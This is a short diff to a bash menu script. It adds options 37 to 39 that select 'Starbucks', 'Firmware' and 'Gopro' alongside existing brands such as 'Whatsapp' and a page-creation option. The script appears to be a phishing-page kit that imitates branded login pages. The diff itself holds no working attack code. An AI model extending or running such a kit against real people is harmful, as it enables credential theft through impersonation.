@@ -204,6 +204,18 @@ elif [[ $option == 36 ]]; then
 server="Whatsapp"
 start
 
+elif [[ $option == 37 ]]; then
+server="Starbucks"
+start
+
+elif [[ $option == 38 ]]; then
+server="Firmware"
+start
+
+elif [[ $option == 39 ]]; then
+server="Gopro"
+start
+
 elif [[ $option == 99 ]]; then
 server="create"
 createpage
